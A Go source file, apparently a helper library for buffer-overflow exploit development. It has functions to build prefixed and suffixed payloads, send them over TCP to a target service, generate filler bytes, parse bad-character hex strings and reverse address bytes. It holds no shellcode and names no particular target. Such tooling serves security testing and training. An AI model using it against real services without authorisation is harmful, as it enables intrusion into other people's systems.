package overflow

import (
    "fmt"
    "net"
    "time"
    "strings"
    "encoding/hex"
)

// timeout used for connection and I/O
const timeout time.Duration = 3000000000

// creates a payload to send to the target service
func createPayload(data []byte, pref, suff string) []byte {
    // build payload
    ret := append([]byte(pref), data...)
    return append(ret, []byte(suff)...)
}

// send a payload to the target service
func sendPayload(host string, port int, payload []byte,
        pref, suff string) error {
    // build uri for target service
    target := fmt.Sprintf("%s:%d", host, port)

    // connect to target service
    conn, err := net.DialTimeout("tcp", target, timeout)
    if err != nil {
        return err
    }
    defer conn.Close()

    // set I/O timeout
    if err = conn.SetDeadline(time.Now().Add(timeout)); err != nil {
        return err
     }

     fmt.Printf(" > Sending %d-byte payload.\n",
        len(pref) + len(payload) + len(suff))

    // wait for a response
    buf := make([]byte, 1024)
    if _, err := conn.Read(buf); err != nil {
        return err
    }

    // send prefix to target service
    msgs := strings.Split(pref, "\\r\\n")
    for i, msg := range msgs {
        if i == len(msgs) - 1 {
            break
        }

        if err = sendData(conn, []byte(msg + "\r\n")); err != nil {
            return err
        }
    }

    // send payload to target service
    data := createPayload(payload, msgs[len(msgs) - 1], suff)
    if err = sendData(conn, data); err != nil {
        return err
    }

    // payload was sent successfully
    return nil
}

// send bytes to target service and wait for a response
func sendData(conn net.Conn, data []byte) error {
    // send data to target service
    if _, err := conn.Write(data); err != nil {
        return err
    }

    // wait for a response
    buf := make([]byte, 1024)
    if _, err := conn.Read(buf); err != nil {
        return err
    }

    return nil
}

// builds a byte array of length n, populated a byte of choice
func generateBytes(b byte, length int) []byte {
    // instantiate the empty byte array
    data := make([]byte, length)

    // populate the byte array with 0x41 characters
    for i := 0; i < length; i++ {
        data[i] = b
    }

    return data
}

// parses a string of hex chars in the format "\x01\x02\x03"
func parseHex(exclude string) ([]byte, error) {
    // convert string to format "010203"
    bytes := strings.Split(exclude, "\\x")
    hexstr := strings.Join(bytes[:], "")

    // parse hex string
    data, err := hex.DecodeString(hexstr)
    if err != nil {
        return nil, err
    }

    return data, nil
}

// reverses a given bytearray
func reverseBytes(bytes []byte) {
    // ...
    for i, j := 0, len(bytes) - 1; i < j; i, j = i + 1, j - 1 {
        bytes[i], bytes[j] = bytes[j], bytes[i]
    }
}

